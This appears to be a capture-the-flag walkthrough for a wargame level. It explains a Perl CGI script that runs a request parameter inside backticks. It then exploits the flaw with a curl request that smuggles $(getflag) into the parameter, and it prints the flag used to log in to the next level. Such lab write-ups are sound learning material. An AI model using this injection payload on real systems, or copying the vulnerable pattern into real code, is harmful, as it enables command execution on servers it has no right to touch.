

# **Level04**

### **Walk through**

For this level, we have a file level04.pl in our home. It's a Perl script. 

`cat level04.pl` gives us:

```perl
#!/usr/bin/perl
# localhost:4747
use CGI qw{param};
print "Content-type: text/html\n\n";
sub x {
  $y = $_[0];
  print `echo $y 2>&1`;
}
x(param("x")); 
```
**sub x** defines a subroutine. In it, there's a variable **y** that takes the value of the first argument of the function. The back ticks mean for **print** that it has to execute the shell command `echo $y 2>&1` instead of print `echo $y 2>&1`. So we can conclude that **y** aka the first param will be executed. So the idea in this case is to pass `getflag` as argument to the **x** subroutine. To do so, we'll use that command:

`curl 'localhost:4747?x=$(getflag)'`  gives us **`ne2searoevaevoem4ov4ar8ap`**

We will use it to log as level05

`su level05`
